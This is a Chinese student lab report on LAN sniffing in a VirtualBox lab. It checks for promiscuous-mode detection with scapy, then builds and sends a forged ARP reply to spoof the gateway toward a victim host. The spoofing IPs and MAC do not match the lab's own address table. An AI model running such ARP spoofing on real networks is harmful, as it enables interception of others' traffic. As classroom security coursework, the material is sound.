# 第四次实验监听实验

## 实验环境

- VirtualBox 虚拟机
- 攻击者主机（Attacker）：Kali Rolling
- 网关（Gateway）：Debian Buster
- 靶机（Victim）：xp-sp3 / Kali 

## 第一个实验

### 实验准备

1. Attacker添加intnet2，保证主机、网关、靶机在同一局域网内

2. 打开kali，修改kali的配置文件，修改之后重启网卡，重新输入ip a，就可以获得kali的ip地址

   ![image-20230105160527668](img\kali ip.png)

3. 同理获取其余主机ip

   |           |       ip       |           mac            |
   | :-------: | :------------: | :----------------------: |
   | Attacker  | 172.16.222.129 |  08:00:27:00:b0:b9 eth1  |
   | Victim-XP | 172.16.222.144 |    08:00:27:22:9c:67     |
   |  Gateway  |  172.16.222.1  | 08:00:27:25:f9:45 enp0s9 |

### 没有开启混杂模式

在靶机上检测混杂模式

```shell
ip link show enp0s3
```

![](img\检查混杂模式.png)

在攻击者主机上开启scapy

```shell
sudo scapy
pkt = promiscping("172.16.222.144")
```

检测结果

![](img\scapy.png)

查看arp缓存表，没有在eth3这块网卡有新的IP与mac对应

![](img\arp缓存.png)

### 开启混杂模式

1. 开启靶机网卡的混杂模式

   ```shell
   sudo ip link set enp0s3 promisc on
   ip link show enp0s3
   ```

   成功开启

   ![](img\开启混杂模式.png)

2. Attacker继续执行上次的scapy命令

   ![](img\开启混杂模式之后.png)

3. 关闭混杂模式

   ![](img\关闭混杂模式.png)

## 第二个实验

获取当前局域网的网关 MAC 地址 构造一个 ARP 请求

```shell
arpbroadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="172.16.222.1")
arpbroadcast.show() ##查看构造好的 ARP 请求报文详情
```

发送这个 ARP 广播请求

```shell
recved = srp(arpbroadcast, timeout=2)
gw_mac = recved[0][0][1].hwsrc
```

伪造网关的 ARP 响应包 准备发送给受害者主机192.168.0.102 ARP 

响应的目的 MAC 地址设置为攻击者主机的 MAC 地址 

```shell
arpspoofed=ARP(op=2, psrc="192.168.0.1", pdst="192.168.0.102", hwdst="08:00:27:bd:92:09")
```

发送上述伪造的 ARP 响应数据包到受害者主机

```shell
sendp(arpspoofed)
```

## 反思总结

自我感觉本次实验完成度不高，依据老师的步骤照猫画虎完成。遇到的问题有在基本网络拓扑与网卡配置方面依旧出现了不少的问题。而且是新的拓扑图，需要去更改attacker的相关网络配置。以后需要多多练习，仔细观察。初步认识了scapy，了解了一些基本的语法与操作。

### 参考资料

[网络通信命令](https://blog.csdn.net/qq_41105501/article/details/117896789)

[Scapy](https://www.osgeo.cn/scapy/introduction.html)

https://c4pr1c3.github.io/cuc-ns/chap0x04/exp.html